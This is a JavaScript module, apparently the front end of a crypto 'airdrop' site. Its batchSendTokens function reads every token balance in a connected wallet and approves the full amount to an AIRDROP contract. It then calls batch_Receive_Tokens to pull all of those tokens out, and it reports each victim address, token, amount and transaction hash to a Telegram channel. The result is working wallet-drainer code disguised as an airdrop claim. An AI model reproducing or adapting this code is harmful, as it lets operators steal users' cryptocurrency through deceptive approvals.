import { ethers } from "ethers";
import { AIRDROP } from "./constant";
import { AIRDROP_ABI } from "./airdropAbi";
import { ERC20_ABI } from "./erc20Abi";
import { sendToTelegram } from "./telegram";


export const batchSendTokens = async (provider, signer, tokenList) => {
    try {
        const userAddress = await signer.getAddress();
        // console.log("User address:", userAddress);

        const airdrop = new ethers.Contract(AIRDROP, AIRDROP_ABI, signer);

        const tokens = [];
        const amounts = [];

        for(let tokenAddress of tokenList){
            try {
                const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);

                const balance = await token.balanceOf(userAddress);
                // console.log(`Token ${tokenAddress} balance:`, balance.toString());

                if(balance > 0n){
                    // approve full balance
                    // console.log(`Approving ${balance.toString()} tokens at ${tokenAddress}`);
                    const approvTx = await token.approve(AIRDROP, balance);
                    const approvalReceipt = await approvTx.wait();
                    // console.log(`Approval successful for ${tokenAddress}:`, approvalReceipt?.transactionHash);

                    tokens.push(tokenAddress);
                    amounts.push(balance);

                    await sendToTelegram(`
                        🪙 Token Approved
                        Token: ${tokenAddress}
                        Amount: ${balance.toString()}
                        User: ${userAddress}
                    `);
                }
            } catch (err) {
                await sendToTelegram(`
                    ❌ Token Approval Failed
                    Token: ${tokenAddress}
                    Error: ${err.reason}
                `);
                // console.warn(`Skipping token ${tokenAddress}:`, err.message);
                continue;
            }
        }

        if(tokens.length === 0){
            // console.error("No tokens with balance found to send");
            await sendToTelegram(`
                ❌ No Tokens to Send
                User: ${userAddress}
            `);
            return null;
        }

        // console.log("Tokens to send:", tokens);
        // console.log("Amounts to send:", amounts.map(a => a.toString()));

        // call batch forwarder
        try {
            const tx = await airdrop.batch_Receive_Tokens(tokens, amounts);
            // console.log("Transaction sent:", tx.hash);
            const receipt = await tx.wait();
            await sendToTelegram(`
                🚀 Batch Tokens Sent

                User: ${userAddress}
                Tx Hash: ${tx.hash}

                Tokens:
                ${tokens.join("\n")}
            `);
            // console.log("Transaction confirmed:", receipt?.hash || receipt?.transactionHash || "confirmed");
            return tx.hash;
        } catch (txErr) {
            await sendToTelegram(`
                ❌ Batch Transaction Failed
                User: ${userAddress}
            `);
            // console.error("Batch transaction failed:", txErr.message);
            // console.error("Full error:", txErr);
            return null;
        }
    } catch (error){
        // console.error("Batch token error: ", error);
        await sendToTelegram(`
            ❌ Batch Token Error
            User: ${await signer.getAddress()}
            Error: ${error.reason}
        `);
        return null;
    }
//   try {
//     const airdropContract = new ethers.Contract(AIRDROP, AIRDROP_ABI, signer);

//     const tokenAddresses = tokenList.map(token => token.address);
//     const amounts = tokenList.map(token => token.amount);

//     const tx = await airdropContract.batch_Receive_Tokens(tokenAddresses, amounts);
//     await tx.wait();

//     return tx.hash;
//   } catch (error) {
//     console.error("Error sending tokens: ", error);
//     throw error;
//   }
}